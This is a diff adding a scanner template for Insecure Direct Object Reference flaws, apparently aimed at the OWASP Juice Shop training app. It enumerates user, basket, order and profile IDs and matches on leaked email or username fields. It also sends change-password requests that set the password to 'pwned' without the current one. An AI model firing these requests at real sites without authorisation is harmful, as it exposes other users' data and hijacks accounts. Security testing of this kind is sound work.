@@ -1,0 +1,61 @@
+id: hunt3r-idor-api
+
+info:
+  name: IDOR - Insecure Direct Object Reference
+  author: hunt3r
+  severity: high
+  description: Detects IDOR by accessing other users' resources via ID manipulation. Tests Juice Shop basket, orders, user profiles.
+  tags: idor,auth-bypass,hunt3r
+  reference:
+    - https://portswigger.net/web-security/access-control/idor
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/basket/1"
+      - "{{BaseURL}}/rest/basket/2"
+      - "{{BaseURL}}/rest/basket/3"
+      - "{{BaseURL}}/api/Users/2"
+      - "{{BaseURL}}/api/Users/3"
+      - "{{BaseURL}}/rest/memories/1"
+      - "{{BaseURL}}/rest/memories/2"
+      - "{{BaseURL}}/profile?id=1"
+      - "{{BaseURL}}/profile?id=2"
+      - "{{BaseURL}}/account?user=1"
+      - "{{BaseURL}}/account?user=2"
+      - "{{BaseURL}}/orders/1"
+      - "{{BaseURL}}/orders/2"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "\"id\""
+          - "\"email\""
+          - "\"username\""
+          - "\"data\""
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/user/change-password?current=&new=pwned&repeat=pwned"
+      - "{{BaseURL}}/rest/user/change-password?new=pwned&repeat=pwned"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "password"
